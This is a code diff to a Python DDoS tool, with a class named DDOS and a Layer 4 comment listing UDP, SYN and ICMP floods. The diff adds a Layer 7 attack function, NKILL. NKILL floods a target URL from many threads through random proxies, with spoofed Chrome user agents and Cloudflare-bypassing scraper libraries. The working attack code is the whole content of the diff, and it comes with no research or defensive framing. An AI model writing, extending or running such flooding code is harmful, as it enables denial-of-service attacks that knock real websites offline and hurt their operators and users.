@@ -6,6 +6,8 @@ global user_agents
 user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
 import cloudscraper, requests, httpx, time, os, socket, socks, ssl, threading, random, struct, sys, colorama, re
+import CloudFlareScraper
+from CloudFlareScraper import CloudFlareScraper
 from bs4 import BeautifulSoup
 from urllib.parse import *
 from requests.cookies import RequestsCookieJar
@@ -14,6 +16,7 @@ import fake_useragent
 from sys import *
 from fake_useragent import UserAgent
 from colorama import *
+from cloudscraper import *
 
 ############################################################################################################################################################################################################################################################################################################################################################################
 
@@ -70,7 +73,6 @@ def savelog(url):
             file.close
             file_name = target
         log(target)
-        print(results)
     except Exception as e:
         print(e)
 def countdown(t):
@@ -796,6 +798,40 @@ class DDOS():
                     timer.start()
                     start_head(url, threadsi, t)
                     timer.join()
+        def NKILL():
+            def nkill(url, threadsi, t):
+                scraper = cloudscraper.create_scraper()
+                scraper2 = cloudscraper.create_scraper(disableCloudflareV1=True)
+                for _ in range(int(threadsi)):
+                    thread = threading.Thread(target=attackkill, args=(url, scraper, scraper2, t))
+                    thread.start()
+            def attackkill(url, scraper, scraper2, t):
+                ua = UserAgent()
+                ip = open('ip_list.txt','r')
+                proxies = ip.readlines()
+                ip.close()
+                header = {
+                    "User-Agent": ua.chrome,
+                }
+                proxy = {
+                    "http": 'http://'+str(random.choice(proxies)),
+                    "https": 'https://'+str(random.choice(proxies))
+                }
+                with CloudFlareScraper(url, proxies=proxy, headers=header) as zcraper:
+                    try:
+                        scraper.get(url, headers=header, proxies=proxy, timeout=15)
+                        scraper2.get(url, headers=header, proxies=proxy, timeout=15)
+                        requests.get(url, headers=header, proxies=proxy, timeout=15)
+                        httpx.get(url, headers=header, proxies=proxy, timeout=15)
+                        zcraper.get()
+                    except:
+                        pass
+            if __name__ == '__main__':
+                url, threadsi, t = layer7_target()
+                timer = threading.Thread(target=countdown, args=(t,))
+                timer.start()
+                nkill(url, threadsi, t)
+                timer.join()
         ################LAYER 4################
         ###UDP TCP TLS SYN ACK ICMP ESP SSH ###
         
